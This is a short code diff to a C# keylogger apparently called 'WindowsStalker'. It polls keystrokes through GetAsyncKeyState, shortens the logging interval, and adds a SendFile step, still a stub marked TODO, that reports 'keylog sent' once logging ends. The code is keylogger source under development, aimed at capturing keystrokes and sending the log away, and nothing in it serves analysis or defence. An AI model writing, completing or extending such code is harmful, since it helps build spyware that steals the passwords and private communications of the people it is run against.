@@ -11,7 +11,7 @@ namespace WindowsStalker
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        public static int loggerTimeUp = 15;
+        public static int loggerTimeUp = 5;
 
         public static void LogKeys()
         {
@@ -33,6 +33,15 @@ namespace WindowsStalker
             Console.WriteLine("stream closed");
             sr.Close();
             s.Stop();
+
+            SendFile("xd");
+        }
+
+        public static bool SendFile(string tmpFilePath)
+        {
+            //TODO
+            Console.WriteLine("keylog sent");
+            return true;
         }
     }
 }
